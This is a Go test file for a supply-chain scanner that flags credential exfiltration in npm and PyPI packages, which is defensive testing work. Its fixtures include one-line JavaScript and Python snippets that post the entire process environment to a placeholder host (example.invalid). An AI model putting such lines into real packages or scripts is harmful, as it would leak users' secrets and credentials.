package gate

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestCredentialPatterns(t *testing.T) {
	data, err := os.ReadFile(filepath.Join("..", "..", "testdata", "detection", "credential-shapes-v1.json"))
	if err != nil {
		t.Fatal(err)
	}
	var corpus struct {
		Version int
		Cases   []struct{ Name, Path, Source, Pattern string }
	}
	if err := json.Unmarshal(data, &corpus); err != nil {
		t.Fatal(err)
	}
	if corpus.Version != 1 || len(corpus.Cases) == 0 {
		t.Fatal("missing versioned detection corpus")
	}
	tp, fp, tn, fn := 0, 0, 0, 0
	for _, tc := range corpus.Cases {
		t.Run(tc.Name, func(t *testing.T) {
			hits := DetectCredentialExfiltration(tc.Path, []byte(tc.Source))
			if tc.Pattern == "" {
				if len(hits) == 0 {
					tn++
				} else {
					fp++
				}
			} else if patternSet(hits)[tc.Pattern] == 3 {
				tp++
			} else {
				fn++
			}
			if tc.Pattern == "" {
				if len(hits) != 0 {
					t.Fatalf("benign control triggered: %+v", hits)
				}
				return
			}
			if patternSet(hits)[tc.Pattern] != 3 {
				t.Fatalf("missing %s: %+v", tc.Pattern, hits)
			}
		})
	}
	t.Logf("credential corpus v%d: TP=%d FP=%d TN=%d FN=%d (synthetic shapes only)", corpus.Version, tp, fp, tn, fn)
}

func TestCredentialPatternsBlockGateAndRedactSource(t *testing.T) {
	for _, eco := range []string{"npm", "pypi"} {
		path, code := "index.js", `fetch('https://example.invalid/SECRET-CANARY', {body: JSON.stringify(process.env)})`
		if eco == "pypi" {
			path, code = "setup.py", `requests.post('https://example.invalid/SECRET-CANARY', json=dict(os.environ))`
		}
		s := NewStaticScan()
		s.Probes = probesWith(eco, stubProbe{tarballURL: "fixture", tarballContents: buildTarball(t, map[string]string{path: code})})
		for _, credentialsOnly := range []bool{false, true} {
			s.CredentialsOnly = credentialsOnly
			result := s.Check(context.Background(), PackageRef{Ecosystem: eco, Name: "fixture", Version: "1"})
			if result.Verdict != VerdictBlock || !strings.Contains(result.Detail, "env-var-exfil-shape") {
				t.Fatalf("%s: expected credential block, got %+v", eco, result)
			}
			if strings.Contains(result.Detail, "SECRET-CANARY") {
				t.Fatal("credential finding exposed raw source")
			}
		}
	}
}

func TestCredentialOnlyScanIgnoresGenericEval(t *testing.T) {
	s := NewStaticScan()
	s.CredentialsOnly = true
	s.Probes = probesWith("npm", stubProbe{tarballURL: "fixture", tarballContents: buildTarball(t, map[string]string{"index.js": "eval(template)"})})
	if r := s.Check(context.Background(), PackageRef{Ecosystem: "npm"}); r.Verdict != VerdictApprove {
		t.Fatalf("generic eval should not be called credential exfiltration: %+v", r)
	}
}
